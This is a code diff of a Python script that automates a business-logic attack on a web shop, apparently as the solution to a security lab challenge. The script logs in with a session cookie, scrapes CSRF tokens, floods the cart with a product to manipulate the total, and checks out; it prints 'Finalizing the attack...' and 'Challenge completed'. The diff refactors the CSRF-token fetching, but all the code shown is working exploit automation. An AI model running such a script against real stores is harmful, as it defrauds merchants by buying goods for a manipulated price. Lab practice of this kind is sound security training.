@@ -16,15 +16,15 @@ MAX_QTY_PER_REQUEST = 99
 
 Product = namedtuple("Product", "name price id")
 
-def cart_csrf_token(session):
-    response = session.get(f"{SERVER}/cart")
+def fetch_csrf_token(session, endpoint):
+    response = session.get(f"{SERVER}/{endpoint}")
     console.log(f"Status code for cart csrf token request= {response.status_code}")
     html_document = html.fromstring(response.content)
-    csrf_token = html_document.xpath("//form[@class='login-form']/input[@name='csrf']/@value")[0]
-    console.log(f"CSRF Token = {csrf_token}")
+    csrf_token = html_document.xpath("//input[@name='csrf']/@value")[0]
     return csrf_token
 
-def checkout(session, csrf_token):
+def checkout(session):
+    csrf_token = fetch_csrf_token(session,'cart')
     response = session.post(f"{SERVER}/cart/checkout", data={
         "csrf": csrf_token,
     })
@@ -41,7 +41,7 @@ def login(session):
     response = session.get(f'{SERVER}/login')
     console.log(f'Status code {response.status_code}')
     document = html.fromstring(response.content)
-    csrf_token = document.xpath("//input[@name='csrf']/@value")[0]
+    csrf_token = fetch_csrf_token(session,'login')
     console.log(f'CSRF token obtained: {csrf_token}')
     response = session.post(f"{SERVER}/login", data = {
         "csrf": csrf_token,
@@ -77,8 +77,6 @@ def fetch_total(session):
     total_int=int(total.replace('$',''))
     return total_int
 
-
-
 def products_table(products):
     table = Table(title="Products")
     table.add_column("Name")
@@ -88,7 +86,6 @@ def products_table(products):
     for product in products:
         table.add_row(product.name, str(product.price), product.id)
     return table
-
 
 
 def second_most_expensive_prodId(products):
@@ -101,7 +98,6 @@ def second_most_expensive_prodId(products):
             second_prod = products[i]
 
     return second_prod
-
 
 
 def flood_the_cart(session,id):
@@ -153,8 +149,7 @@ def main(sid:str):
         console.log(f'TO PAY NOW: {fetch_total(session)}')
 
     with console.status('Finalizing the attack...'):
-        token=cart_csrf_token(session)
-        response=checkout(session, token)
+        response=checkout(session)
         if response.status_code == 200:
             console.log('Challenge completed')
 
